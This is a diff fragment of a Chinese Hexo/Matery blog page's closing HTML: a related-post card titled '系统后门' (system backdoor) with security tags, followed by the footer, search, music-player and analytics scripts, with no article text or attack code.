+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="系统后门">
+                        
+                        <span class="card-title">系统后门</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%90%8E%E9%97%A8/">
+                        <span class="chip bg-color">后门</span>
+                    </a>
+                    
+                    <a href="/tags/msf/">
+                        <span class="chip bg-color">msf</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                    <a href="/tags/windows/">
+                        <span class="chip bg-color">windows</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">Broken-year</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Broken-year" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2011416908@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2011416908" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2011416908" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+	
+	<!-- 冒泡 -->
+	
+		<script type="text/javascript">
+			// 只在桌面版网页启用特效
+			var windowWidth = $(window).width();
+			document.write(
+				'<script type="text/javascript" src="/libs/others/buble.js"><\/script>'
+			);
+		</script>
+	
+
+	
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
